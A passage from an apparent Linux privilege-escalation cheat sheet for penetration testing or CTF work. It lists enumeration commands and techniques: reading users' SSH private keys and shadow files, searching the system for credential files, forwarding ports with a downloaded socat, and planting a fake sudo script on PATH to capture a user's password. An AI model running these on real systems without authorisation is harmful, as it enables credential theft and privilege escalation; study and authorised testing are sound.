<span class="syntax-built_in">ls</span> -la /home /root /etc/ssh /home/*/.ssh/; locate id_rsa; locate id_dsa; find / -name id_rsa 2&gt; /dev/null; find / -name id_dsa 2&gt; /dev/null; find / -name authorized_keys 2&gt; /dev/null; <span class="syntax-built_in">cat</span> /home/*/.ssh/id_rsa; <span class="syntax-built_in">cat</span> /home/*/.ssh/id_dsa

<span class="syntax-comment"># Root folder of web server</span>
<span class="syntax-built_in">ls</span> /var/www/

<span class="syntax-comment"># Sometimes, we find something...</span>
<span class="syntax-built_in">ls</span> -la /opt/
<span class="syntax-built_in">ls</span> -la /srv/

<span class="syntax-comment"># Temporary files</span>
<span class="syntax-built_in">ls</span> -la /dev/shm/
<span class="syntax-built_in">ls</span> -la /tmp

<span class="syntax-comment"># Services</span>
<span class="syntax-built_in">ls</span> -al /etc/systemd/system/
<span class="syntax-built_in">ls</span> -al /lib/systemd/system/

<span class="syntax-comment"># Mails</span>
<span class="syntax-built_in">ls</span> -la /var/mail
<span class="syntax-built_in">ls</span> -la /var/spool/mail

<span class="syntax-comment"># Security policies</span>
<span class="syntax-built_in">ls</span> -la /etc/apparmor.d/

<span class="syntax-comment"># Kernel</span>
<span class="syntax-comment"># Print the message buffer of the kernel</span>
dmesg
<span class="syntax-comment"># --human: Human readable output</span>
dmesg --human
<span class="syntax-comment"># --follow: Wait for new messages</span>
dmesg --follow
<span class="syntax-comment"># List kernel modules</span>
lsmod
<span class="syntax-built_in">cat</span> /proc/modules

<span class="syntax-comment"># Routing table</span>
ip route show
<span class="syntax-comment"># -r: route</span>
<span class="syntax-comment"># -n: don't resolve name</span>
netstat -rn

<span class="syntax-comment"># Check outdated packages</span>
apt list --upgradable
apt list --upgradable | grep polkit
</code><button class="codecopy_copy" data-codecopy="2">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<br>
<h2 id="open-ports" tabindex="-1"><a href="#open-ports" class="header-anchor">Open Ports</a></h2>
<pre class="codecopy_pre codecopy_pre_3"><code class="language-sh hljs language-bash"><span class="syntax-comment"># -p: display PID/Program name for sockets</span>
<span class="syntax-comment"># -u: udp</span>
<span class="syntax-comment"># -n: don't resolve names</span>
<span class="syntax-comment"># -t: tcp</span>
<span class="syntax-comment"># -a: display all sockets</span>
netstat -punta

<span class="syntax-comment"># Filter only LISTEN ports</span>
netstat -punta | grep -i listen

<span class="syntax-comment"># -n: don't resolve service names</span>
<span class="syntax-comment"># -t: show only TCP sockets</span>
<span class="syntax-comment"># -p: show process using socket</span>
<span class="syntax-comment"># -u: show only UDP sockets</span>
ss -ntpu
</code><button class="codecopy_copy" data-codecopy="3">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<p>To find listening ports, add <strong>"-l"</strong> flag.</p>
<pre class="codecopy_pre codecopy_pre_4"><code class="language-sh hljs language-bash"><span class="syntax-comment"># -l: show listening sockets</span>
ss -ltp
</code><button class="codecopy_copy" data-codecopy="4">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<h3 id="access-open-ports-that-cannot-be-accessed-from-outside" tabindex="-1"><a href="#access-open-ports-that-cannot-be-accessed-from-outside" class="header-anchor">Access open ports that cannot be accessed from outside</a></h3>
<p>If we discover a listen port that cannot be accessed externally as below, we can access this port by port forwarding.</p>
<pre class="codecopy_pre codecopy_pre_5"><code class="language-txt hljs language-plaintext">tcp  0  0  127.0.0.1:8080  0.0.0.0:*  LISTEN  -                   
</code><button class="codecopy_copy" data-codecopy="5">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<p>There are various methods to do that.</p>
<ul>
<li>
<p><strong>Method 1. Using Socat</strong></p>
<p>In remote machine,  download the socat and run it.</p>
<pre class="codecopy_pre codecopy_pre_6"><code class="language-sh hljs language-bash"><span class="syntax-comment"># we need to download the socat binary file from local machine</span>
wget http://&lt;local-ip&gt;:&lt;local-port&gt;/socat
<span class="syntax-built_in">chmod</span> +x socat
socat tcp-listen:8090,fork,reuseaddr tcp:localhost:8080
</code><button class="codecopy_copy" data-codecopy="6">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
</li>
<li>
<p><strong>Method 2. Using SSH Tunnel (SSH credential required)</strong></p>
<p>In local machine, run the ‘ssh -L’.</p>
<pre class="codecopy_pre codecopy_pre_7"><code class="language-sh hljs language-bash">ssh -L 8090:localhost:8080 remote-user@&lt;remote-ip&gt;
</code><button class="codecopy_copy" data-codecopy="7">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
</li>
</ul>
<p>Now we can access to <strong>http://&lt;remote-ip&gt;:8090/</strong> in local machine and actually can get the content of <strong>http://&lt;remote-ip&gt;:8080/</strong>.</p>
<br>
<h2 id="process-monitors" tabindex="-1"><a href="#process-monitors" class="header-anchor">Process Monitors</a></h2>
<pre class="codecopy_pre codecopy_pre_8"><code class="language-sh hljs language-bash"><span class="syntax-comment"># List all processes</span>
lsof
<span class="syntax-comment"># Select IPv[46] files</span>
lsof -i
<span class="syntax-comment"># Select IPv[46] files against specific port</span>
lsof -i:53
lsof -i:80
<span class="syntax-comment"># Select IPv[46] files against specific port (no port names)</span>
lsof -i:53 -P
lsof -i:80 -P
<span class="syntax-comment"># Specify user</span>
lsof -u username


<span class="syntax-comment"># Display the currently-running processes.</span>
ps
ps aux
ps aux | grep ping
<span class="syntax-comment"># If the right side of the result is cut off, pipe with cat command.</span>
ps aux | <span class="syntax-built_in">cat</span>
ps aux | <span class="syntax-built_in">cat</span> | grep ping
</code><button class="codecopy_copy" data-codecopy="8">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<p>By using <strong><a href="https://github.com/DominicBreuker/pspy">pspy</a></strong>, you can fetch processes without root privileges.</p>
<pre class="codecopy_pre codecopy_pre_9"><code class="language-sh hljs language-bash">./pspy64

<span class="syntax-comment"># -p: print commands to stdout</span>
<span class="syntax-comment"># -f: print file system events to stdout</span>
<span class="syntax-comment"># -i: interval in milliseconds</span>
./pspy64 -pf -i 1000
</code><button class="codecopy_copy" data-codecopy="9">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<h3 id="dump-information" tabindex="-1"><a href="#dump-information" class="header-anchor">Dump Information</a></h3>
<p>If some process (like ping) is running as root, you may be able to capture the interesting information using tcpdump.</p>
<pre class="codecopy_pre codecopy_pre_10"><code class="language-sh hljs language-bash"><span class="syntax-comment"># -i lo: specify interface (lo: loopback address, localhost)</span>
<span class="syntax-comment"># -A: print each packet in ASCII</span>
tcpdump -i lo -A
</code><button class="codecopy_copy" data-codecopy="10">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<h3 id="override-command" tabindex="-1"><a href="#override-command" class="header-anchor">Override Command</a></h3>
<p>If some command is executed in processes as our current user, we can override the command to our arbitrary command.<br>
Assume <strong><code>sudo cat /etc/shadow</code></strong> command is executed in the process.<br>
<strong><code>sudo</code></strong> command asks the password of the current user. So if we don't have the current user's password yet, worth getting the password.</p>
<p>To do so, we can create the fake <strong><code>sudo</code></strong> command under the current user’s home directory.</p>
<pre class="codecopy_pre codecopy_pre_11"><code class="language-bash hljs"><span class="syntax-built_in">mkdir</span> /home/&lt;user&gt;/bin
<span class="syntax-built_in">touch</span> /home/&lt;user&gt;/bin/sudo
<span class="syntax-built_in">chmod</span> +x /home/&lt;user&gt;/bin/sudo
</code><button class="codecopy_copy" data-codecopy="11">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<p>Then insert a payload in <strong><code>/home/&lt;user&gt;/bin/sudo</code></strong>.<br>
This <strong><code>sudo</code></strong> command reads the value of the password in prompt and write the value to <strong>“password.txt”</strong>.</p>
<pre class="codecopy_pre codecopy_pre_12"><code class="language-bash hljs"><span class="syntax-meta">#!/bin/bash</span>

<span class="syntax-built_in">read</span> password
<span class="syntax-built_in">echo</span> <span class="syntax-variable">$password</span> &gt;&gt; /home/&lt;user&gt;/password.txt
</code><button class="codecopy_copy" data-codecopy="12">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<p>In addition, we need to export the <strong><code>/home/&lt;user&gt;/bin</code></strong> to the PATH on the top of the <strong><code>/home/&lt;user&gt;/.bashrc</code></strong>.</p>
<pre class="codecopy_pre codecopy_pre_13"><code class="language-bash hljs"><span class="syntax-built_in">export</span> PATH=/home/&lt;user&gt;/bin:<span class="syntax-variable">$PATH</span>
</code><button class="codecopy_copy" data-codecopy="13">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<p>Wait a while, we should see the <strong>“password.txt”</strong> is created.</p>
<pre class="codecopy_pre codecopy_pre_14"><code class="language-bash hljs"><span class="syntax-built_in">cat</span> password.txt
</code><button class="codecopy_copy" data-codecopy="14">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<p>Now we get the current user password.</p>
<br>
<h2 id="process-tracing" tabindex="-1"><a href="#process-tracing" class="header-anchor">Process Tracing</a></h2>
<p>Sometimes we can retrieve the sensitive information by reading sequential processes with <code>stract</code>.</p>
<pre class="codecopy_pre codecopy_pre_15"><code class="language-bash hljs">strace -e <span class="syntax-built_in">read</span> -p `ps -ef | grep php | awk <span class="syntax-string">'{print $2}'</span>`
</code><button class="codecopy_copy" data-codecopy="15">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<br>
<h2 id="sensitive-files-with-given-keywords" tabindex="-1"><a href="#sensitive-files-with-given-keywords" class="header-anchor">Sensitive Files with Given Keywords</a></h2>
<p>The <strong>"find"</strong> command searches files in the real system.</p>
<pre class="codecopy_pre codecopy_pre_16"><code class="language-sh hljs language-bash">find / -name <span class="syntax-string">"*.txt"</span> 2&gt;/dev/null
find /opt -name <span class="syntax-string">"*.txt"</span> 2&gt;/dev/null
find / -name <span class="syntax-string">"passwd"</span> 2&gt;/dev/null
find / -name <span class="syntax-string">"authorized_keys"</span> 2&gt;/dev/null
find / -name <span class="syntax-string">"users"</span> 2&gt;/dev/null
find / -name <span class="syntax-string">"*user*"</span> 2&gt;/dev/null
find / -name <span class="syntax-string">"secret.key"</span> -or -name <span class="syntax-string">"secret"</span> 2&gt;/dev/null
find / -name <span class="syntax-string">"credential*.txt"</span> 2&gt;/dev/null
find / -name <span class="syntax-string">"*secret*"</span> -or -name <span class="syntax-string">"*credential*"</span> 2&gt;/dev/null
find / -name <span class="syntax-string">"*root*"</span> -or -name <span class="syntax-string">"*password*"</span> 2&gt;/dev/null
find / -name <span class="syntax-string">"*.key"</span> -or -name <span class="syntax-string">"*.db"</span> 2&gt;/dev/null
find / -name <span class="syntax-string">"*data*"</span> 2&gt;/dev/null
find / -name <span class="syntax-string">".env"</span> 2&gt;/dev/null
find / -name <span class="syntax-string">"*flag*"</span> 2&gt;/dev/null

<span class="syntax-comment"># SQL files</span>
find / -name <span class="syntax-string">"*.sql"</span> 2&gt;/dev/null
strings example.sql

<span class="syntax-comment"># Backup files may contain sensitive information</span>
find / -name <span class="syntax-string">"*backup*"</span> 2&gt;/dev/null
find / -name <span class="syntax-string">"*.bak*"</span> 2&gt;/dev/null
find / -name <span class="syntax-string">"*.back*"</span> 2&gt;/dev/null
find / -name <span class="syntax-string">"*.old"</span> 2&gt;/dev/null

<span class="syntax-comment"># Histories</span>
find / -name <span class="syntax-string">"*history*"</span> 2&gt;/dev/null

<span class="syntax-comment"># Backup files for /etc/shadow.</span>
<span class="syntax-comment"># ex. /var/shadow.bak</span>
find / -name *shadow* 2&gt;/dev/null

<span class="syntax-comment"># Kerberos</span>
find / -name <span class="syntax-string">"*.keytab"</span> 2&gt;/dev/null
</code><button class="codecopy_copy" data-codecopy="16">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<p>If you want to find more faster, use <strong>"locate"</strong> command.<br>
It searches from the database on the system. It's faster than "find" but the found information is older.</p>
<pre class="codecopy_pre codecopy_pre_17"><code class="language-sh hljs language-bash">locate data
locate flag
locate flag*.txt
locate *flag*
locate password
locate *password*
locate *save*
locate *save.txt
locate user.txt
locate user*
locate *user*
locate root.txt
locate *root*
locate .db
locate .txt
</code><button class="codecopy_copy" data-codecopy="17">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<br>
<h2 id="suid-(set-user-id)" tabindex="-1"><a href="#suid-(set-user-id)" class="header-anchor">SUID (Set User ID)</a></h2>
<p>It allows users to run an executable as root privilege.</p>
<pre class="codecopy_pre codecopy_pre_18"><code class="language-sh hljs language-bash"><span class="syntax-comment"># Option 1</span>
find / -<span class="syntax-built_in">type</span> f -perm -04000 2&gt;/dev/null
<span class="syntax-comment"># Option 2</span>
find / -<span class="syntax-built_in">type</span> f -perm -u=s 2&gt;/dev/null
<span class="syntax-comment"># Option 3</span>
find / -user root -perm -4000 -<span class="syntax-built_in">exec</span> <span class="syntax-built_in">ls</span> -ldb {} \; 2&gt;/dev/null
</code><button class="codecopy_copy" data-codecopy="18">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<p>If you'll get some SUID files, research the information of them using <strong><a href="https://gtfobins.github.io/">GTFOBins</a></strong>.</p>
<h3 id="find" tabindex="-1"><a href="#find" class="header-anchor">Find</a></h3>
<p>If the "find" command is set as SUID, you can execute some commands as root privileges.</p>
<pre class="codecopy_pre codecopy_pre_19"><code class="language-sh hljs language-bash">find ./ -<span class="syntax-built_in">exec</span> <span class="syntax-string">"whoami"</span> \;
find /etc/shadow -<span class="syntax-built_in">exec</span> <span class="syntax-built_in">cat</span> {} \;
find /root -<span class="syntax-built_in">exec</span> <span class="syntax-built_in">ls</span> -al {} \;
</code><button class="codecopy_copy" data-codecopy="19">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
    <path stroke-linecap="round" stroke-linejoin="round" d="M15.75 17.25v3.375c0 .621-.504 1.125-1.125 1.125h-9.75a1.125 1.125 0 01-1.125-1.125V7.875c0-.621.504-1.125 1.125-1.125H6.75a9.06 9.06 0 011.5.124m7.5 10.376h3.375c.621 0 1.125-.504 1.125-1.125V11.25c0-4.46-3.243-8.161-7.5-8.876a9.06 9.06 0 00-1.5-.124H9.375c-.621 0-1.125.504-1.125 1.125v3.5m7.5 10.375H9.375a1.125 1.125 0 01-1.125-1.125v-9.25m12 6.625v-1.875a3.375 3.375 0 00-3.375-3.375h-1.5a1.125 1.125 0 01-1.125-1.125v-1.5a3.375 3.375 0 00-3.375-3.375H9.75"></path>
</svg><span class="codecopy_result">Copied!</span></button></pre>
<h3 id="cputils" tabindex="-1"><a href="#cputils" class="header-anchor">Cputils</a></h3>
<p>If the "cputils" is set as SUID, you can copy the sensitive file to another one.</p>
<pre class="codecopy_pre codecopy_pre_20"><code class="language-sh hljs language-bash">cputils

Enter the name of <span class="syntax-built_in">source</span> file: /home/&lt;user&gt;/.ssh/id_rsa
Enter the name of target file: /tmp/id_rsa
</code><button class="codecopy_copy" data-codecopy="20">
<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewbox="0 0 24 24" stroke-width="2.0" stroke="currentColor" class="w-6 h-6">
